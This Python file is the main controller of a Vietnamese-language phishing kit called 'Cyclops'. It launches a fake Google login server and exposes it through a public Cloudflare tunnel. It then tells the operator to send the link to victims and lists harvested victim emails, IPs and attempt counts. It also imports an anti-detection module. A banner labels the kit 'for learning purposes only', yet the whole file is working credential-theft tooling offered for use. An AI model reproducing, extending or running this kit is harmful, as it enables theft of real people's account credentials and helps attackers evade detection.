#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
🔥 CYCLOPS - MAIN CONTROLLER
Mắt thần báo thức - Điều khiển toàn bộ hệ thống
"""

import os
import sys
import time
import json
import threading
import subprocess
import webbrowser
from pathlib import Path
from datetime import datetime
import colorama
from colorama import Fore, Style, Back

# Thêm đường dẫn để import
sys.path.insert(0, str(Path(__file__).parent))

# Import các module
from backend.app import app, run_server
from backend.database import db
from backend.logger import logger
from backend.config import config
from modules.cloudflare import CloudflareTunnel
from modules.admin_panel import AdminPanel
from modules.anti_detect import anti_detect
from utils.validators import validator
from utils.decorators import log_function_call, error_handler

colorama.init(autoreset=True)

class CyclopsMain:
    """Lớp điều khiển chính - Nơi mọi thứ hội tụ"""
    
    def __init__(self):
        self.version = "2.0.0"
        self.name = "Cyclops"
        self.running = False
        self.server_thread = None
        self.tunnel = None
        self.public_url = None
        self.stats = {}
        
        # Tạo thư mục cần thiết
        self._init_directories()
        
        # Đăng ký routes admin
        self.admin_panel = AdminPanel(app)
        
        # Load stats
        self._update_stats()
        
    def _init_directories(self):
        """Tạo các thư mục cần thiết"""
        dirs = ['data', 'logs', 'frontend', 'backend', 'modules', 'utils']
        for d in dirs:
            Path(d).mkdir(exist_ok=True)
            # Tạo __init__.py cho Python
            if d in ['backend', 'modules', 'utils']:
                init_file = Path(d) / '__init__.py'
                if not init_file.exists():
                    init_file.touch()
        logger.info("📁 Directories initialized")
    
    def _update_stats(self):
        """Cập nhật thống kê"""
        self.stats = db.get_stats()
    
    def show_banner(self):
        """Hiển thị banner CYCLOPS"""
        banner = f"""
{Fore.RED}╔══════════════════════════════════════════════════════════════╗
{Fore.RED}║                                                              ║
{Fore.RED}║  {Fore.YELLOW}██████╗ {Fore.RED}██╗   ██╗ ██████╗██╗      ██████╗ ██████╗ ███████╗{Fore.RED}║
{Fore.RED}║  {Fore.YELLOW}██╔══██╗{Fore.RED}╚██╗ ██╔╝██╔════╝██║     ██╔═══██╗██╔══██╗██╔════╝{Fore.RED}║
{Fore.RED}║  {Fore.YELLOW}██████╔╝{Fore.RED} ╚████╔╝ ██║     ██║     ██║   ██║██████╔╝███████╗{Fore.RED}║
{Fore.RED}║  {Fore.YELLOW}██╔═══╝ {Fore.RED}  ╚██╔╝  ██║     ██║     ██║   ██║██╔═══╝ ╚════██║{Fore.RED}║
{Fore.RED}║  {Fore.YELLOW}██║     {Fore.RED}   ██║   ╚██████╗███████╗╚██████╔╝██║     ███████║{Fore.RED}║
{Fore.RED}║  {Fore.YELLOW}╚═╝     {Fore.RED}   ╚═╝    ╚═════╝╚══════╝ ╚═════╝ ╚═╝     ╚══════╝{Fore.RED}║
{Fore.RED}║                                                              ║
{Fore.RED}║  {Fore.CYAN}🔥 MẮT THẦN BÁO THỨC - PHIÊN BẢN {Fore.YELLOW}{self.version}{Fore.CYAN}  {Fore.RED}║
{Fore.RED}║  {Fore.GREEN}⚡ DEVELOPED BY CYCLOPS TEAM {Fore.RED}                         ║
{Fore.RED}║  {Fore.MAGENTA}🔴 CẢNH BÁO: CHỈ DÙNG CHO MỤC ĐÍCH HỌC TẬP {Fore.RED}        ║
{Fore.RED}║                                                              ║
{Fore.RED}╚══════════════════════════════════════════════════════════════╝{Fore.RESET}
        """
        print(banner)
        print(f"{Fore.CYAN}⏰ Khởi động: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{Fore.RESET}")
        print(f"{Fore.GREEN}💻 Số nạn nhân: {self.stats.get('total_victims', 0)}{Fore.RESET}")
        print(f"{Fore.YELLOW}🌐 IP duy nhất: {self.stats.get('unique_ips', 0)}{Fore.RESET}")
        print("=" * 70)
    
    def show_menu(self):
        """Hiển thị menu tương tác"""
        menu = f"""
{Fore.CYAN}╔════════════════════════════════════════════════════════╗
{Fore.CYAN}║  {Fore.YELLOW}🔥 MENU ĐIỀU KHIỂN CYCLOPS {Fore.CYAN}                        ║
{Fore.CYAN}╠════════════════════════════════════════════════════════╣
{Fore.CYAN}║  {Fore.GREEN}1. 🚀 KHỞI TẠO GOOGLE PHISHING {Fore.CYAN}                  ║
{Fore.CYAN}║  {Fore.GREEN}2. 📊 XEM DỮ LIỆU ĐÃ THU THẬP {Fore.CYAN}                  ║
{Fore.CYAN}║  {Fore.GREEN}3. 🌐 LẤY LINK PUBLIC {Fore.CYAN}                          ║
{Fore.CYAN}║  {Fore.GREEN}4. 🛡️ KIỂM TRA TRẠNG THÁI {Fore.CYAN}                     ║
{Fore.CYAN}║  {Fore.GREEN}5. 💀 DỪNG TOÀN BỘ {Fore.CYAN}                             ║
{Fore.CYAN}║  {Fore.GREEN}6. 🔄 RESET DỮ LIỆU {Fore.CYAN}                            ║
{Fore.CYAN}║  {Fore.GREEN}7. 🐚 MỞ TERMINAL LOG {Fore.CYAN}                         ║
{Fore.CYAN}║  {Fore.GREEN}8. ❌ THOÁT {Fore.CYAN}                                   ║
{Fore.CYAN}╚════════════════════════════════════════════════════════╝{Fore.RESET}
        """
        print(menu)
    
    @log_function_call
    @error_handler
    def start_server(self):
        """Khởi chạy server"""
        if self.running:
            logger.warning("⚠️ Server đã đang chạy")
            return False
        
        try:
            logger.info("🔥 Khởi động server...")
            
            # Chạy server trong thread riêng
            self.server_thread = threading.Thread(
                target=run_server,
                daemon=True,
                name="CyclopsServer"
            )
            self.server_thread.start()
            
            # Đợi server khởi động
            time.sleep(2)
            
            # Kiểm tra server
            import requests
            try:
                response = requests.get('http://localhost:5000/health', timeout=3)
                if response.status_code == 200:
                    self.running = True
                    logger.success("✅ Server đã khởi động thành công!")
                    logger.info(f"🌐 Truy cập: http://localhost:5000")
                    logger.info(f"📊 Admin panel: http://localhost:5000/admin")
                    return True
            except:
                logger.error("❌ Server khởi động thất bại")
                return False
                
        except Exception as e:
            logger.error(f"❌ Lỗi khởi động: {e}")
            return False
    
    @log_function_call
    @error_handler
    def start_tunnel(self):
        """Khởi tạo tunnel cloudflare"""
        if not config.is_cloudflare_enabled():
            logger.warning("⚠️ Cloudflare đang tắt")
            return None
        
        try:
            logger.info("🌐 Đang tạo tunnel public...")
            self.tunnel = CloudflareTunnel(5000)
            self.public_url = self.tunnel.start_tunnel()
            
            if self.public_url:
                logger.success(f"✅ Link công khai: {self.public_url}")
                # Lưu link vào file
                with open('public_url.txt', 'w') as f:
                    f.write(self.public_url)
                return self.public_url
            else:
                logger.error("❌ Không thể tạo link public")
                return None
                
        except Exception as e:
            logger.error(f"❌ Lỗi tunnel: {e}")
            return None
    
    @log_function_call
    @error_handler
    def show_data(self):
        """Hiển thị dữ liệu đã thu thập"""
        victims = db.get_victims(20)
        
        if not victims:
            print(f"\n{Fore.YELLOW}📭 Chưa có dữ liệu nào!{Fore.RESET}\n")
            return
        
        print(f"\n{Fore.GREEN}╔════════════════════════════════════════════════════════╗")
        print(f"{Fore.GREEN}║  📊 DỮ LIỆU NẠN NHÂN ({len(victims)} records)              ║")
        print(f"{Fore.GREEN}╚════════════════════════════════════════════════════════╝{Fore.RESET}")
        print(f"{Fore.CYAN}{'ID':<5} {'EMAIL':<30} {'IP':<15} {'ATTEMPTS':<10} {'TIME'}")
        print("-" * 80)
        
        for v in victims:
            print(f"{Fore.WHITE}{v['id']:<5} {v['email']:<30} {v['ip']:<15} {v['attempts']:<10} {v['timestamp'][:19]}{Fore.RESET}")
        
        print(f"\n{Fore.GREEN}📊 Tổng cộng: {db.get_stats()['total_victims']} nạn nhân{Fore.RESET}\n")
    
    @log_function_call
    @error_handler
    def show_status(self):
        """Hiển thị trạng thái hệ thống"""
        stats = db.get_stats()
        
        status = f"""
{Fore.CYAN}╔════════════════════════════════════════════════════════╗
{Fore.CYAN}║  🛡️ TRẠNG THÁI HỆ THỐNG {Fore.CYAN}                                 ║
{Fore.CYAN}╠════════════════════════════════════════════════════════╣
{Fore.CYAN}║  {Fore.GREEN}Server: {'✅ Đang chạy' if self.running else '❌ Đã dừng'}{Fore.CYAN}                    ║
{Fore.CYAN}║  {Fore.GREEN}Version: {Fore.YELLOW}{self.version}{Fore.CYAN}                                            ║
{Fore.CYAN}║  {Fore.GREEN}Tunnel: {Fore.YELLOW}{self.public_url if self.public_url else '❌ Chưa kết nối'}{Fore.CYAN} ║
{Fore.CYAN}║  {Fore.GREEN}Nạn nhân: {Fore.RED}{stats.get('total_victims', 0)}{Fore.CYAN}                                         ║
{Fore.CYAN}║  {Fore.GREEN}IP duy nhất: {Fore.RED}{stats.get('unique_ips', 0)}{Fore.CYAN}                                     ║
{Fore.CYAN}║  {Fore.GREEN}Tổng lượt thử: {Fore.RED}{stats.get('total_attempts', 0)}{Fore.CYAN}                                   ║
{Fore.CYAN}╚════════════════════════════════════════════════════════╝{Fore.RESET}
        """
        print(status)
    
    @log_function_call
    @error_handler
    def stop_all(self):
        """Dừng toàn bộ hệ thống"""
        logger.warning("💀 Đang dừng toàn bộ hệ thống...")
        
        # Dừng tunnel
        if self.tunnel:
            self.tunnel.stop_tunnel()
            self.tunnel = None
            self.public_url = None
        
        # Dừng server
        self.running = False
        
        # Ghi log
        logger.info("🛑 Đã dừng toàn bộ hệ thống")
        print(f"\n{Fore.RED}💀 CYCLOPS ĐÃ NGƯNG HOẠT ĐỘNG{Fore.RESET}\n")
    
    @log_function_call
    @error_handler
    def reset_data(self):
        """Reset toàn bộ dữ liệu"""
        confirm = input(f"{Fore.RED}⚠️ Bạn có chắc muốn xóa tất cả dữ liệu? (y/n): {Fore.RESET}")
        if confirm.lower() == 'y':
            db.clear_all()
            logger.success("✅ Đã xóa toàn bộ dữ liệu")
            self._update_stats()
        else:
            logger.info("❌ Hủy thao tác xóa")
    
    @log_function_call
    @error_handler
    def open_log(self):
        """Mở file log trong termux"""
        log_file = Path('logs/cyclops.log')
        if log_file.exists():
            print(f"\n{Fore.GREEN}📝 Đang hiển thị log...{Fore.RESET}")
            os.system(f'cat {log_file} | tail -50')
            print(f"\n{Fore.CYAN}📄 Log đầy đủ: {log_file}{Fore.RESET}")
        else:
            logger.warning("⚠️ Chưa có file log")
    
    def main_loop(self):
        """Vòng lặp chính của CYCLOPS"""
        self.show_banner()
        
        while True:
            self.show_menu()
            choice = input(f"\n{Fore.YELLOW}👑 [CYCLOPS] Nhập lựa chọn: {Fore.RESET}").strip()
            
            if choice == '1':
                if self.start_server():
                    print(f"\n{Fore.GREEN}✅ Server đã khởi động!{Fore.RESET}")
                    print(f"{Fore.CYAN}🌐 Local: http://localhost:5000{Fore.RESET}")
                    
                    # Tự động tạo tunnel
                    url = self.start_tunnel()
                    if url:
                        print(f"{Fore.GREEN}🌐 Public: {url}{Fore.RESET}")
                        print(f"{Fore.YELLOW}📋 Copy link này gửi cho nạn nhân!{Fore.RESET}")
                    else:
                        print(f"{Fore.RED}⚠️ Không có link public, dùng localhost{Fore.RESET}")
                    
                    print(f"{Fore.CYAN}📊 Admin panel: http://localhost:5000/admin{Fore.RESET}")
                    input(f"\n{Fore.GREEN}⏎ Nhấn Enter để tiếp tục...{Fore.RESET}")
                else:
                    input(f"\n{Fore.RED}❌ Khởi động thất bại! Nhấn Enter...{Fore.RESET}")
            
            elif choice == '2':
                self.show_data()
                input(f"\n{Fore.GREEN}⏎ Nhấn Enter để tiếp tục...{Fore.RESET}")
            
            elif choice == '3':
                if self.public_url:
                    print(f"\n{Fore.GREEN}🌐 Link hiện tại: {self.public_url}{Fore.RESET}")
                else:
                    print(f"\n{Fore.YELLOW}🔄 Đang tạo link mới...{Fore.RESET}")
                    url = self.start_tunnel()
                    if url:
                        print(f"{Fore.GREEN}✅ Link mới: {url}{Fore.RESET}")
                    else:
                        print(f"{Fore.RED}❌ Không thể tạo link{Fore.RESET}")
                input(f"\n{Fore.GREEN}⏎ Nhấn Enter để tiếp tục...{Fore.RESET}")
            
            elif choice == '4':
                self.show_status()
                input(f"\n{Fore.GREEN}⏎ Nhấn Enter để tiếp tục...{Fore.RESET}")
            
            elif choice == '5':
                self.stop_all()
                input(f"\n{Fore.GREEN}⏎ Nhấn Enter để tiếp tục...{Fore.RESET}")
            
            elif choice == '6':
                self.reset_data()
                input(f"\n{Fore.GREEN}⏎ Nhấn Enter để tiếp tục...{Fore.RESET}")
            
            elif choice == '7':
                self.open_log()
                input(f"\n{Fore.GREEN}⏎ Nhấn Enter để tiếp tục...{Fore.RESET}")
            
            elif choice == '8':
                self.stop_all()
                print(f"\n{Fore.RED}🔥 CYCLOPS TẠM BIỆT!{Fore.RESET}")
                sys.exit(0)
            
            else:
                print(f"{Fore.RED}❌ Lựa chọn không hợp lệ!{Fore.RESET}")
                time.sleep(1)

def main():
    """Hàm khởi chạy chính"""
    try:
        # Kiểm tra Python version
        if sys.version_info < (3, 8):
            print(f"{Fore.RED}❌ Cần Python 3.8 trở lên!{Fore.RESET}")
            sys.exit(1)
        
        # Khởi tạo CYCLOPS
        cyclops = CyclopsMain()
        cyclops.main_loop()
        
    except KeyboardInterrupt:
        print(f"\n\n{Fore.YELLOW}⚠️ Nhận tín hiệu dừng từ bàn phím{Fore.RESET}")
        sys.exit(0)
    except Exception as e:
        print(f"{Fore.RED}💀 Lỗi nghiêm trọng: {e}{Fore.RESET}")
        logger.critical(f"Fatal error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
